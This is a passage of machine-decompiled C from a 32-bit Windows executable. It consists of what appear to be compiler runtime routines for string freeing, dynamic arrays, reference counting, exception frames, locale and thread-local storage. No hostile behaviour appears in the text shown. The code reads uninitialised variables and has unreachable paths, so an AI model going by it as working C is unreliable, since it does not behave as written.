    int32_t * v10 = (int32_t *)(v6 - 4);
    bool v11 = v7 == 0; // 0x403893
    int32_t v12 = v7; // 0x403893
    int32_t v13 = v2 + 1; // 0x4038c0
    int32_t result; // 0x403893
    while (true) {
        // 0x4038b3
        int32_t v14; // 0x403893
        int32_t v15 = v14;
        int32_t v16 = v15; // 0x4038b3
        int32_t v17 = v12; // 0x4038b3
        int32_t v18; // 0x403893
        if (v12 == 0) {
            // ._crit_edge
            v18 = v15;
            v12 = 0;
            result = 0;
            if (!v11) {
                // break -> 0x4038cc
                break;
            }
        } else {
            int32_t v19 = v16 + v9; // 0x4038b3
            int32_t v20 = v17 - 1; // 0x4038b3
            v18 = v19;
            v12 = v20;
            while (*(char *)v16 != (char)v2) {
                // .lr.ph
                v16 = v19;
                result = 0;
                if (v20 == 0) {
                    return result;
                }
                v19 = v16 + v9;
                v20--;
                v18 = v19;
                v12 = v20;
            }
        }
        int32_t v21 = v18; // 0x4038bf
        *v10 = v13;
        *(int32_t *)(v6 - 8) = v21;
        int32_t v22 = v4; // 0x4038bd
        int32_t v23 = v21; // 0x4038bd
        if (v22 == 0) {
            // 0x4038cf
            result = v21 - v5;
            return result;
        }
        int32_t v24 = v13;
        char v25 = *(char *)v23; // 0x4038bd
        v22--;
        int32_t v26 = v24 + v9; // 0x4038bd
        v23 += v9;
        while (*(char *)v24 == v25) {
            if (v22 == 0) {
                // 0x4038cf
                result = v21 - v5;
                return result;
            }
            v24 = v26;
            v25 = *(char *)v23;
            v22--;
            v26 = v24 + v9;
            v23 += v9;
        }
        // 0x4038c3
        v13 = *v10;
        v11 = false;
        v14 = v21;
    }
  lab_0x4038cc:
    // 0x4038cc
    return result;
}

// Address range: 0x4038db - 0x40393d
int32_t function_4038db(void) {
    int32_t v1 = 0; // 0x4038e6
    uint32_t v2; // 0x4038db
    int32_t v3; // 0x4038db
    if (v2 >= 1) {
        if (v3 != 0) {
            // 0x4038ee
            if (*(int32_t *)(v3 - 8) == 1) {
                // 0x4038f4
                function_40257f();
                *(char *)(v3 + v2) = 0;
                // 0x403939
                int32_t result; // 0x4038db
                return result;
            }
        }
        int32_t v4 = function_40348f(); // 0x403913
        v1 = 0;
        if (v4 != 0) {
            // 0x403920
            function_402643();
            v1 = v4;
        }
    }
    int32_t result2 = function_4033f7(); // 0x403932
    *(int32_t *)v3 = v1;
    // 0x403939
    return result2;
}

// Address range: 0x40393f - 0x403946
int32_t function_40393f(void) {
    // 0x40393f
    return function_402627((int32_t)&g118);
}

// Address range: 0x403946 - 0x403947
int32_t function_403946(void) {
    // 0x403946
    int32_t result; // 0x403946
    return result;
}

// Address range: 0x403947 - 0x40395c
int32_t function_403947(void) {
    // 0x403947
    int32_t result; // 0x403947
    if (result != 0) {
        // 0x40394d
        *(int32_t *)result = 0;
        SysFreeString((int16_t *)result);
    }
    // 0x40395b
    return result;
}

// Address range: 0x40395f - 0x403980
int32_t function_40395f(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40395f
    int32_t v1; // bp-8, 0x40395f
    int32_t v2 = &v1;
    int32_t v3; // 0x40395f
    int32_t * v4 = (int32_t *)v3; // 0x403965
    int32_t v5 = *v4; // 0x403965
    int32_t result = 0; // 0x403969
    int32_t v6 = v2; // 0x403969
    if (v5 != 0) {
        // 0x40396b
        *v4 = 0;
        v6 = v2 - 4;
        *(int32_t *)v6 = v5;
        SysFreeString((int16_t *)&g118);
        result = &g118;
    }
    // 0x403977
    int32_t v7; // 0x40395f
    int32_t v8 = v7 - 1; // 0x40397a
    v3 += 4;
    while (v8 != 0) {
        // 0x403965
        v2 = v6;
        v4 = (int32_t *)v3;
        v5 = *v4;
        result = 0;
        v6 = v2;
        if (v5 != 0) {
            // 0x40396b
            *v4 = 0;
            v6 = v2 - 4;
            *(int32_t *)v6 = v5;
            SysFreeString((int16_t *)&g118);
            result = &g118;
        }
        // 0x403977
        v8--;
        v3 += 4;
    }
    // 0x40397d
    return result;
}

// Address range: 0x403983 - 0x4039a7
int32_t function_403983(void) {
    // 0x403983
    int32_t v1; // 0x403983
    int32_t v2; // 0x403983
    if (v2 == 0) {
        v1 = function_403947();
    }
    uint32_t v3 = *(int32_t *)(v2 - 4); // 0x40398b
    int32_t v4 = v1; // 0x403990
    if (v3 < 2) {
        v4 = function_403947();
    }
    int32_t result = SysReAllocStringLen((int16_t **)(v3 / 2), (int16_t *)v2, v4); // 0x403999
    if (result != 0) {
        // 0x4039a6
        return result;
    }
    function_40393f();
    // UNREACHABLE
}

// Address range: 0x4039a7 - 0x4039d8
int32_t function_4039a7(void) {
    int32_t v1; // 0x4039a7
    for (uint32_t i = *(int32_t *)(v1 + 6 + (int32_t)*(char *)(v1 + 1)); i >= 1; i--) {
        // 0x4039b9
        function_4039f3();
    }
    // 0x4039d2
    int32_t result; // 0x4039a7
    return result;
}

// Address range: 0x4039db - 0x4039f2
int32_t function_4039db(void) {
    // 0x4039db
    if (g12 != 0) {
        // 0x4039e4
        int32_t result; // 0x4039db
        return result;
    }
    // 0x4039eb
    function_402627((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x4039f2 - 0x4039f3
int32_t function_4039f2(void) {
    // 0x4039f2
    int32_t result; // 0x4039f2
    return result;
}

// Address range: 0x4039f3 - 0x403add
int32_t function_4039f3(void) {
    // 0x4039f3
    int32_t v1; // 0x4039f3
    int32_t result; // 0x4039f3
    if (v1 == 0) {
        // 0x403adc
        return result;
    }
    int32_t v2; // 0x4039f3
    switch ((char)v2) {
        case 10: {
            if (v1 > 1) {
                // 0x403a47
                function_40341b();
            } else {
                // 0x403a3d
                function_4033f7();
            }
            // 0x403adc
            return result;
        }
        case 11: {
            if (v1 > 1) {
                // 0x403a61
                int32_t v3; // 0x4039f3
                int32_t v4; // 0x4039f3
                int32_t v5; // 0x4039f3
                function_40395f(result, v5, v4, v3);
            } else {
                // 0x403a5a
                function_403947();
            }
            // 0x403adc
            return result;
        }
        case 12: {
            int32_t v6; // 0x4039f3
            uint32_t v7 = v6;
            function_4039db();
            v6 = v7 - 1;
            while (v7 > 1) {
                // 0x403a6a
                v7 = v6;
                function_4039db();
                v6 = v7 - 1;
            }
            // 0x403adc
            return result;
        }
        case 13: {
            int32_t v8; // 0x4039f3
            uint32_t v9 = v8;
            function_4039f3();
            v8 = v9 - 1;
            while (v9 > 1) {
                // 0x403a7c
                v9 = v8;
                function_4039f3();
                v8 = v9 - 1;
            }
            // 0x403adc
            return result;
        }
        case 14: {
            int32_t v10; // 0x4039f3
            uint32_t v11 = v10;
            function_4039a7();
            v10 = v11 - 1;
            while (v11 > 1) {
                // 0x403a9a
                v11 = v10;
                function_4039a7();
                v10 = v11 - 1;
            }
            // 0x403adc
            return result;
        }
        case 15: {
            int32_t v12; // 0x4039f3
            uint32_t v13 = v12;
            function_404017();
            v12 = v13 - 1;
            while (v13 > 1) {
                // 0x403aad
                v13 = v12;
                function_404017();
                v12 = v13 - 1;
            }
            // 0x403adc
            return result;
        }
        case 17: {
            int32_t v14; // 0x4039f3
            uint32_t v15 = v14;
            function_403ed7();
            v14 = v15 - 1;
            while (v15 > 1) {
                // 0x403abc
                v15 = v14;
                function_403ed7();
                v14 = v15 - 1;
            }
            // 0x403adc
            return result;
        }
    }
    // 0x403acd
    function_402627(result);
    // UNREACHABLE
}

// Address range: 0x403adf - 0x403af6
int32_t function_403adf(void) {
    // 0x403adf
    if (g13 != 0) {
        // 0x403ae8
        int32_t result; // 0x403adf
        return result;
    }
    // 0x403aef
    function_402627((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x403af6 - 0x403af7
int32_t function_403af6(void) {
    // 0x403af6
    int32_t result; // 0x403af6
    return result;
}

// Address range: 0x403af7 - 0x403c11
int32_t function_403af7(void) {
    // 0x403af7
    int32_t v1; // 0x403af7
    int32_t v2 = v1 + 10 + (int32_t)*(char *)(v1 + 1); // 0x403b04
    int32_t v3 = *(int32_t *)(v2 - 8); // bp-20, 0x403b10
    int32_t result = 0; // 0x403b10
    int32_t v4 = &v3; // 0x403b10
    int32_t v5 = *(int32_t *)(v2 - 4); // 0x403b10
    int32_t v6 = v2; // 0x403b10
    while (true) {
        int32_t v7 = v4;
        int32_t * v8 = (int32_t *)(v6 + 4); // 0x403b11
        if (*v8 > result) {
            // 0x403b18
            function_402643();
        }
        int32_t v9 = *(int32_t *)*(int32_t *)v6; // 0x403b28
        int32_t v10; // 0x403af7
        int32_t v11; // 0x403af7
        switch (*(char *)v9) {
            case 10: {
                // 0x403b62
                function_40344b();
                v10 = 4;
                v11 = v7;
                // break -> 0x403bf0
                break;
            }
            case 11: {
                // 0x403b73
                function_403983();
                v10 = 4;
                v11 = v7;
                // break -> 0x403bf0
                break;
            }
            case 12: {
                // 0x403b84
                function_403adf();
                v10 = 16;
                v11 = v7;
                // break -> 0x403bf0
                break;
            }
            case 13: {
                int32_t v12 = (int32_t)*(char *)(v9 + 1); // 0x403b97
                int32_t v13 = v7 - 4; // 0x403b9a
                *(int32_t *)v13 = *(int32_t *)(v9 + 2 + v12);
                int32_t * v14 = (int32_t *)(v7 - 8); // 0x403b9e
                *v14 = *(int32_t *)(v9 + v12 + 6);
                function_403c13((int32_t)&g118);
                v10 = *v14;
                v11 = v13;
                // break -> 0x403bf0
                break;
            }
            case 14: {
                int32_t * v15 = (int32_t *)(v7 - 4); // 0x403bbe
                *v15 = *(int32_t *)(v9 + 2 + (int32_t)*(char *)(v9 + 1));
                function_403af7();
                v10 = *v15;
                v11 = v7;
                // break -> 0x403bf0
                break;
            }
            case 15: {
                // 0x403bce
                function_40402f();
                v10 = 4;
                v11 = v7;
                // break -> 0x403bf0
                break;
            }
            case 17: {
                // 0x403bdf
                function_403f13();
                v10 = 4;
                v11 = v7;
                // break -> 0x403bf0
                break;
            }
            default: {
                // 0x403b57
                function_402627((int32_t)&g118);
                // UNREACHABLE
            }
        }
        // 0x403bf0
        v4 = v11;
        result = *v8 + v10;
        v5--;
        v6 += 8;
        if (v5 == 0) {
            // 0x403bfd
            if (*(int32_t *)v4 > result) {
                // 0x403c0c
                return function_402643();
            }
            // 0x403c0c
            return result;
        }
    }
    // 0x403b57
    function_402627((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x403c13 - 0x403d05
int32_t function_403c13(int32_t a1) {
    int32_t v1 = a1; // 0x403c68
    int32_t v2 = a1; // 0x403c7f
    int32_t v3 = a1; // 0x403c93
    int32_t v4 = a1; // 0x403cd1
    int32_t v5 = a1; // 0x403ce5
    int32_t v6 = a1; // 0x403cfb
    int32_t result; // 0x403c13
    int32_t result2; // 0x403cab
    int32_t v7; // 0x403c13
    switch ((char)v7) {
        case 10: {
            v1--;
            result = function_40344b();
            while (v1 != 0) {
                // 0x403c59
                v1--;
                result = function_40344b();
            }
            // 0x403cfe
            return result;
        }
        case 11: {
            v2--;
            result = function_403983();
            while (v2 != 0) {
                // 0x403c70
                v2--;
                result = function_403983();
            }
            // 0x403cfe
            return result;
        }
        case 12: {
            v3--;
            result = function_403adf();
            while (v3 != 0) {
                // 0x403c84
                v3--;
                result = function_403adf();
            }
            // 0x403cfe
            return result;
        }
        case 13: {
            unsigned char v8 = *(char *)(v7 + 1); // 0x403c9a
            int32_t v9; // bp-16, 0x403c13
            int32_t v10 = &v9; // 0x403c9d
            int32_t v11 = a1; // 0x403c9d
            v10 -= 4;
            *(int32_t *)v10 = *(int32_t *)(v7 + 6 + (int32_t)v8);
            result2 = function_403c13((int32_t)&g118);
            v11--;
            while (v11 != 0) {
                // 0x403ca1
                v10 -= 4;
                *(int32_t *)v10 = *(int32_t *)(v7 + 6 + (int32_t)v8);
                result2 = function_403c13((int32_t)&g118);
                v11--;
            }
            // break -> 0x403cfe
            break;
        }
        case 14: {
            function_403af7();
            v4--;
            while (v4 != 0) {
                // 0x403cb9
                function_403af7();
                v4--;
            }
            // 0x403cfe
            return (int32_t)*(char *)(v7 + 1);
        }
        case 15: {
            v5--;
            result = function_40402f();
            while (v5 != 0) {
                // 0x403cd6
                v5--;
                result = function_40402f();
            }
            // 0x403cfe
            return result;
        }
        case 17: {
            v6--;
            result = function_403f13();
            while (v6 != 0) {
                // 0x403cea
                v6--;
                result = function_403f13();
            }
            // 0x403cfe
            return result;
        }
        default: {
            // 0x403c4e
            int32_t v12; // 0x403c13
            function_402627(v12);
            // UNREACHABLE
        }
    }
    // 0x403cfe
    return result2;
}

// Address range: 0x403d05 - 0x403d06
int32_t function_403d05(void) {
    // 0x403d05
    int32_t result; // 0x403d05
    return result;
}

// Address range: 0x403d07 - 0x403d0e
int32_t function_403d07(void) {
    // 0x403d07
    return function_402627((int32_t)&g118);
}

// Address range: 0x403d0e - 0x403d0f
int32_t function_403d0e(void) {
    // 0x403d0e
    int32_t result; // 0x403d0e
    return result;
}

// Address range: 0x403d0f - 0x403d17
int32_t function_403d0f(void) {
    int32_t result = 0; // 0x403d11
    int32_t v1; // 0x403d0f
    if (v1 != 0) {
        // 0x403d13
        result = *(int32_t *)(v1 - 4);
    }
    // 0x403d16
    return result;
}

// Address range: 0x403d17 - 0x403d1e
int32_t function_403d17(void) {
    // 0x403d17
    return function_403d0f() - 1;
}

// Address range: 0x403d1f - 0x403d2e
int32_t function_403d1f(int32_t a1) {
    // 0x403d1f
    int32_t v1; // 0x403d1f
    return function_403c13(v1);
}

// Address range: 0x403d2f - 0x403d34
int32_t function_403d2f(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    // 0x403d2f
    return function_4039f3();
}

// Address range: 0x403d34 - 0x403d35
int32_t function_403d34(void) {
    // 0x403d34
    int32_t result; // 0x403d34
    return result;
}

// Address range: 0x403d37 - 0x403d3d
int32_t function_403d37(int32_t a1, int32_t a2) {
    // 0x403d37
    return function_403ed7();
}

// Address range: 0x403d3f - 0x403ecb
int32_t function_403d3f(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x403d58
    int32_t v2; // 0x403d3f
    int32_t v3; // 0x403d3f
    if (v1 >= 0 != v1 != 0) {
        if (v1 >= 0) {
            // 0x403ec2
            return function_403d37(v2, v3);
        }
        // 0x403d62
        function_402627(v2);
        // UNREACHABLE
    }
    int32_t v4 = 0; // 0x403d7f
    int32_t v5 = 0; // 0x403d7f
    int32_t v6; // 0x403d3f
    if (v6 != 0) {
        // 0x403d81
        v4 = *(int32_t *)(v6 - 4);
        v5 = v6 - 8;
    }
    int32_t v7 = v4;
    int32_t v8; // 0x403d3f
    int32_t v9 = v8 + (int32_t)*(char *)(v8 + 1); // 0x403d91
    int32_t v10 = *(int32_t *)(v9 + 2); // 0x403d95
    int32_t v11 = *(int32_t *)(v9 + 6); // 0x403d9b
    int32_t v12 = 0; // 0x403da0
    if (v11 != 0) {
        // 0x403da2
        v12 = *(int32_t *)v11;
    }
    int32_t v13 = v10 * v1; // 0x403daa
    if (v10 != (int32_t)((0x100000000 * (int64_t)(v13 >> 31) | (int64_t)v13) / (int64_t)v1)) {
        // 0x403dbb
        function_402627(v2);
        // UNREACHABLE
    }
    // 0x403dc2
    int32_t v14; // bp-48, 0x403d3f
    int32_t v15 = &v14; // 0x403d47
    int32_t v16; // 0x403d3f
    int32_t v17; // 0x403d3f
    if (v5 == 0) {
        goto lab_0x403dcf;
    } else {
        int32_t * v18 = (int32_t *)v5; // 0x403dca
        int32_t v19 = *v18; // 0x403dca
        if (v19 != 1) {
            // 0x403e04
            *v18 = v19 - 1;
            int32_t v20 = function_40253f(); // 0x403e09
            if (v12 == 0) {
                // 0x403e4c
                function_402643();
                v16 = v20;
                v17 = v15;
            } else {
                int32_t v21 = v1 < v7 ? v1 : v7;
                function_4027a7();
                int32_t v22 = v21; // bp-52, 0x403e38
                function_403d1f(v21);
                v16 = v20;
                v17 = &v22;
            }
            goto lab_0x403e62;
        } else {
            goto lab_0x403dcf;
        }
    }
  lab_0x403dcf:
    if (v1 < v7 && v12 != 0) {
        // 0x403ddb
        int32_t v23; // 0x403d3f
        int32_t v24; // 0x403d3f
        int32_t v25; // 0x403d3f
        function_403d2f(v2, v3, v7, v10, v13 + 8, v5, v25, v24, v23);
    }
    // 0x403df4
    function_40257f();
    v16 = v5;
    v17 = v15;
    goto lab_0x403e62;
  lab_0x403e62:
    // 0x403e62
    *(int32_t *)v16 = 1;
    *(int32_t *)(v16 + 4) = v1;
    function_4027a7();
    int32_t result; // 0x403d3f
    if (v3 < 2) {
        // 0x403ebd
        *(int32_t *)v6 = v16 + 8;
        // 0x403ec2
        return result;
    }
    int32_t v26 = 0; // 0x403e99
    if (v1 < 1) {
        // 0x403ebd
        *(int32_t *)v6 = v16 + 8;
        // 0x403ec2
        return result;
    }
    int32_t v27 = v17 - 4; // 0x403ea6
    *(int32_t *)v27 = a1 + 4;
    function_403d3f(v26);
    int32_t v28 = v1 - 1; // 0x403eba
    v26++;
    int32_t v29 = v27; // 0x403ebb
    int32_t v30 = v28; // 0x403ebb
    while (v28 != 0) {
        // 0x403ea3
        v27 = v29 - 4;
        *(int32_t *)v27 = a1 + 4;
        function_403d3f(v26);
        v28 = v30 - 1;
        v26++;
        v29 = v27;
        v30 = v28;
    }
    // 0x403ebd
    *(int32_t *)v6 = v16 + 8;
    // 0x403ec2
    return result;
}

// Address range: 0x403ecb - 0x403ed6
int32_t function_403ecb(void) {
    // 0x403ecb
    int32_t v1; // 0x403ecb
    return function_403d3f((int32_t)&v1 + 4);
}

// Address range: 0x403ed7 - 0x403f11
int32_t function_403ed7(void) {
    // 0x403ed7
    int32_t result; // 0x403ed7
    if (result == 0) {
        // 0x403f10
        return result;
    }
    // 0x403edd
    *(int32_t *)result = 0;
    int32_t * v1 = (int32_t *)(result - 8); // 0x403ee3
    int32_t v2 = *v1 - 1; // 0x403ee3
    *v1 = v2;
    if (v2 != 0) {
        // 0x403f10
        return result;
    }
    // 0x403ee9
    int32_t v3; // 0x403ed7
    if (*(int32_t *)(v3 + 6 + (int32_t)*(char *)(v3 + 1)) != 0) {
        // 0x403ef9
        if (*(int32_t *)(result - 4) != 0) {
            // 0x403f00
            function_4039f3();
        }
    }
    // 0x403f07
    function_40255f();
    // 0x403f10
    return result;
}

// Address range: 0x403f13 - 0x403f3a
int32_t function_403f13(void) {
    // 0x403f13
    int32_t v1; // 0x403f13
    if (v1 != 0) {
        int32_t * v2 = (int32_t *)(v1 - 8); // 0x403f1a
        *v2 = *v2 + 1;
    }
    int32_t result; // 0x403f13
    if (result == 0) {
        // 0x403f36
        return result;
    }
    int32_t * v3 = (int32_t *)(result - 8); // 0x403f22
    int32_t v4 = *v3; // 0x403f22
    int32_t v5 = v4 - 1; // 0x403f22
    *v3 = v5;
    if (v5 == 0) {
        // 0x403f28
        *v3 = v4;
        function_403ed7();
    }
    // 0x403f36
    return result;
}

// Address range: 0x403f3b - 0x403f95
int32_t function_403f3b(void) {
    // 0x403f3b
    if (g19 == 0) {
        // 0x403f8e
        return 0;
    }
    // 0x403f55
    int32_t v1; // bp-24, 0x403f3b
    int32_t v2 = &v1; // 0x403f43
    int32_t v3 = v2 - 12;
    int32_t * v4 = (int32_t *)v3;
    int32_t result = g19; // 0x403f83
    int32_t v5; // bp-4, 0x403f3b
    *(int32_t *)(v2 - 4) = (int32_t)&v5;
    *(int32_t *)(v2 - 8) = 0x403f76;
    *v4 = __readfsdword(0);
    __writefsdword(0, v3);
    __writefsdword(0, *v4);
    result = *(int32_t *)result;
    while (result != 0) {
        // 0x403f55
        *(int32_t *)(v2 - 4) = (int32_t)&v5;
        *(int32_t *)(v2 - 8) = 0x403f76;
        *v4 = __readfsdword(0);
        __writefsdword(0, v3);
        __writefsdword(0, *v4);
        result = *(int32_t *)result;
    }
    // 0x403f8e
    return result;
}

// Address range: 0x403f97 - 0x403fa5
int32_t function_403f97(void) {
    // 0x403f97
    int32_t result; // 0x403f97
    *(int32_t *)result = g18;
    return result;
}

// Address range: 0x403fa7 - 0x40400b
int32_t function_403fa7(void) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x403fb6
    __writefsdword(0, (int32_t)&v1);
    function_403f3b();
    __writefsdword(0, v1);
    int32_t result; // 0x403fa7
    int32_t v2; // 0x403fa7
    if (v2 == g18) {
        // 0x40400a
        return result;
    }
    // 0x403feb
    if (g18 == 0) {
        // 0x40400a
        return 0;
    }
    int32_t result2 = g18;
    int32_t * v3 = (int32_t *)result2;
    int32_t v4 = *v3; // 0x403ff4
    while (v4 != v2) {
        // 0x404004
        result = v4;
        if (v4 == 0) {
            // 0x40400a
            return result;
        }
        result2 = v4;
        v3 = (int32_t *)result2;
        v4 = *v3;
    }
    // 0x403ffb
    *v3 = result2;
    // 0x40400a
    return result2;
}

// Address range: 0x40400b - 0x404010
int32_t function_40400b(void) {
    // 0x40400b
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404010 - 0x404012
int32_t function_404010(void) {
    // 0x404010
    int32_t result; // 0x404010
    return result;
}

// Address range: 0x404012 - 0x404015
int32_t function_404012(int32_t a1, int32_t a2) {
    // 0x404012
    int32_t result; // 0x404012
    return result;
}

// Address range: 0x404017 - 0x40402c
int32_t function_404017(void) {
    // 0x404017
    int32_t result; // 0x404017
    if (result != 0) {
        // 0x40401d
        *(int32_t *)result = 0;
    }
    // 0x40402b
    return result;
}

// Address range: 0x40402f - 0x40405b
int32_t function_40402f(void) {
    // 0x40402f
    int32_t result; // 0x40402f
    if (result != 0) {
        // 0x404033
        return result;
    }
    // 0x40404c
    int32_t result2; // 0x40402f
    *(int32_t *)result2 = 0;
    return result2;
}

// Address range: 0x40405b - 0x4040c1
int32_t function_40405b(void) {
    int32_t v1 = __readfsdword(0); // bp-36, 0x40406f
    __writefsdword(0, (int32_t)&v1);
    int32_t LCType; // bp-15, 0x40405b
    int32_t cchData; // 0x40405b
    GetLocaleInfoA(7, (int32_t)&LCType, (char *)0x1004, cchData);
    function_403537();
    function_402833();
    __writefsdword(0, cchData);
    return function_4033f7();
}

// Address range: 0x4040c1 - 0x4040c6
int32_t function_4040c1(void) {
    // 0x4040c1
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4040c6 - 0x4040c8
int32_t function_4040c6(void) {
    // 0x4040c6
    int32_t result; // 0x4040c6
    return result;
}

// Address range: 0x4040c8 - 0x4040cf
int32_t function_4040c8(int32_t a1) {
    // 0x4040c8
    int32_t result; // 0x4040c8
    return result;
}

// Address range: 0x4040cf - 0x404119
int32_t function_4040cf(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4040da
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g59 + 1; // 0x4040e0
    g59 = v2;
    if (v2 == 0) {
        // 0x4040e8
        function_4026c3();
        function_4026c3();
        function_4026c3();
        function_401943();
    }
    // 0x40410b
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404119 - 0x40411e
int32_t function_404119(void) {
    // 0x404119
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40411e - 0x404120
int32_t function_40411e(void) {
    // 0x40411e
    int32_t result; // 0x40411e
    return result;
}

// Address range: 0x404120 - 0x404122
int32_t function_404120(int32_t a1) {
    // 0x404120
    int32_t result; // 0x404120
    return result;
}

// Address range: 0x404123 - 0x4041f6
int32_t function_404123(void) {
    int32_t v1 = g59; // 0x404123
    g59 = v1 - 1;
    if (v1 != 0) {
        // 0x4041f5
        int32_t result; // 0x404123
        return result;
    }
    // 0x404130
    *(char *)&g11 = 2;
    g42 = 0x4010ef;
    g43 = 0x4010f7;
    *(char *)&g52 = 2;
    g40 = 0x403d07;
    if ((char)function_40293f() != 0) {
        // 0x404165
        function_40296f();
    }
    // 0x40416a
    *(int16_t *)&g54 = -0x2850;
    g55 = -0x2850;
    *(int16_t *)&g56 = -0x2850;
    g48 = (int32_t)GetCommandLineA();
    g47 = function_40118f();
    if (GetVersion() < 0) {
        // 0x4041dc
        GetThreadLocale();
        g60 = function_40405b();
    } else {
        // 0x4041af
        if ((GetVersion() & 255) < 5) {
            // 0x4041cb
            GetThreadLocale();
            g60 = function_40405b();
        } else {
            // 0x4041bf
            g60 = 3;
        }
    }
    int32_t threadId = GetCurrentThreadId(); // 0x4041eb
    g45 = threadId;
    // 0x4041f5
    return threadId;
}

// Address range: 0x4041f7 - 0x4041fd
int32_t * function_4041f7(int32_t uFlags, int32_t uBytes) {
    // 0x4041f7
    return LocalAlloc(uFlags, uBytes);
}

// Address range: 0x4041ff - 0x404205
int32_t * function_4041ff(int32_t * hMem) {
    // 0x4041ff
    return LocalFree(hMem);
}

// Address range: 0x404207 - 0x40420d
int32_t function_404207(void) {
    // 0x404207
    return TlsAlloc();
}

// Address range: 0x40420f - 0x404215
bool function_40420f(int32_t dwTlsIndex) {
    // 0x40420f
    return TlsFree(dwTlsIndex);
}

// Address range: 0x404217 - 0x40421d
int32_t * function_404217(int32_t dwTlsIndex) {
    // 0x404217
    return TlsGetValue(dwTlsIndex);
}

// Address range: 0x40421f - 0x404225
bool function_40421f(int32_t dwTlsIndex, int32_t * lpTlsValue) {
    // 0x40421f
    return TlsSetValue(dwTlsIndex, lpTlsValue);
}

// Address range: 0x404227 - 0x404230
int32_t function_404227(void) {
    // 0x404227
    int32_t uFlags; // 0x404227
    return (int32_t)LocalAlloc(uFlags, 64);
}

// Address range: 0x404233 - 0x404239
int32_t function_404233(int32_t a1) {
    // 0x404233
    return 8;
}

// Address range: 0x40423b - 0x40427f
int32_t function_40423b(void) {
    // 0x40423b
    int32_t v1; // 0x40423b
    if (function_404233(v1) == 0) {
        // 0x40427d
        return 0;
    }
    // 0x404247
    if (g21 == -1) {
        // 0x404250
        function_4033eb((int32_t)&g118);
        // UNREACHABLE
    }
    int32_t dwTlsIndex = function_404227(); // 0x40425c
    if (dwTlsIndex != 0) {
        // 0x40427d
        return TlsSetValue(dwTlsIndex, (int32_t *)g21);
    }
    // 0x404265
    function_4033eb((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x40427f - 0x4042a8
int32_t function_40427f(void) {
    // 0x40427f
    g21 = TlsAlloc();
    function_40423b();
    int32_t result = (int32_t)TlsGetValue(g21); // 0x40429d
    g85 = result;
    return result;
}

// Address range: 0x4042ab - 0x4042d3
int32_t function_4042ab(void) {
    // 0x4042ab
    if (g21 == -1) {
        // 0x4042d2
        return 8;
    }
    int32_t * hMem = TlsGetValue(g21); // 0x4042c3
    int32_t result = (int32_t)hMem; // 0x4042ca
    if (hMem != NULL) {
        // 0x4042cc
        result = (int32_t)LocalFree(hMem);
    }
    // 0x4042d2
    return result;
}

// Address range: 0x4042d3 - 0x4042f6
int32_t function_4042d3(void) {
    int32_t result = function_4042ab(); // 0x4042e8
    if (g21 != -1) {
        // 0x4042ea
        result = TlsFree(g21);
    }
    // 0x4042f5
    return result;
}

// Address range: 0x4042f7 - 0x404337
int32_t function_4042f7(void) {
    // 0x4042f7
    if (g81 == 0) {
        // 0x404306
        return *(int32_t *)(__readfsdword(44) + 4 * g21);
    }
    int32_t * v1 = TlsGetValue(g21); // 0x40432d
    if (v1 != NULL) {
        // 0x404336
        return (int32_t)v1;
    }
    // 0x404311
    function_40423b();
    int32_t * v2 = TlsGetValue(g21); // 0x40431c
    if (v2 == NULL) {
        // 0x404326
        return g85;
    }
    // 0x404325
    return (int32_t)v2;
}

// Address range: 0x404337 - 0x404342
int32_t function_404337(int32_t a1, int32_t a2) {
    // 0x404337
    return function_403f97();
}

// Address range: 0x404343 - 0x404389
int32_t function_404343(void) {
    // 0x404343
    int32_t v1; // 0x404343
    if (*(int32_t *)(v1 + 12) == 1) {
        // 0x40434e
        g81 = 1;
        int32_t v2 = *(int32_t *)(v1 + 8); // 0x404357
        g82 = (int32_t (*)(int32_t, int32_t, int32_t))v2;
        g23 = v2;
        g24 = 0;
        g25 = 0;
        int32_t v3; // 0x404343
        function_404337(v3, (int32_t)&g22);
    }
    // 0x404378
    return function_403127(g83);
}

// Address range: 0x40438b - 0x4043b0
int32_t function_40438b(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404396
    __writefsdword(0, (int32_t)&v1);
    g84++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4043b0 - 0x4043b5
int32_t function_4043b0(void) {
    // 0x4043b0
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4043b5 - 0x4043b7
int32_t function_4043b5(void) {
    // 0x4043b5
    int32_t result; // 0x4043b5
    return result;
}

// Address range: 0x4043b7 - 0x4043b9
int32_t function_4043b7(int32_t a1) {
    // 0x4043b7
    int32_t result; // 0x4043b7
    return result;
}

// Address range: 0x4043bb - 0x4043c3
int32_t function_4043bb(void) {
    // 0x4043bb
    g84--;
    int32_t result; // 0x4043bb
    return result;
}

// Address range: 0x4043c3 - 0x4043e8
int32_t function_4043c3(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4043ce
    __writefsdword(0, (int32_t)&v1);
    g86++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4043e8 - 0x4043ed
int32_t function_4043e8(void) {
    // 0x4043e8
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4043ed - 0x4043ef
int32_t function_4043ed(void) {
    // 0x4043ed
    int32_t result; // 0x4043ed
    return result;
}

// Address range: 0x4043ef - 0x4043f1
int32_t function_4043ef(int32_t a1) {
    // 0x4043ef
    int32_t result; // 0x4043ef
    return result;
}

// Address range: 0x4043f3 - 0x4043fb
int32_t function_4043f3(void) {
    // 0x4043f3
    g86--;
    int32_t result; // 0x4043f3
    return result;
}

// Address range: 0x4043fb - 0x404401
int32_t function_4043fb(int32_t * hKey) {
    // 0x4043fb
    return RegCloseKey(hKey);
}

